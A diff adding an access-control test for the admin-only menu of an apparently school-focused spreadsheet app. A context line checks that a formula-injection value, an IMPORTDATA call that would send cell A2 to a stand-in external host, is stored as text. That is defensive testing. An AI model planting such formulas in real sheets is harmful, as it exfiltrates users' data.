@@ -346,3 +346,18 @@ test('text that looks like a formula is stored as text', () => {
   assert.equal(row.title, '=IMPORTDATA("https://x.example/?"&A2)');
   assert.equal(g.Store.headers('Assessments').length > 0, true);
 });
+
+test('only ADMINs in the Staff tab can use the Sheet menu', () => {
+  const t = fresh({ user: 'tl.head@school.example' });
+  assert.throws(() => g.requireAdmin_(), /Only admins can use this menu/);   // SLT is not enough
+  t.as(t.fx.people.teacher);
+  assert.throws(() => g.requireAdmin_(), /Only admins/);
+  assert.throws(() => g.requireAdmin_(true), /Only admins/);                // an ADMIN already exists
+  t.as('admin@school.example');
+  assert.doesNotThrow(() => g.requireAdmin_());
+  // A brand-new Sheet with no ADMIN yet: only Set up lets the first person in.
+  t.backend.db.Staff.rows = [];
+  t.as('new.person@school.example');
+  assert.throws(() => g.requireAdmin_(), /Only admins/);
+  assert.doesNotThrow(() => g.requireAdmin_(true));
+});
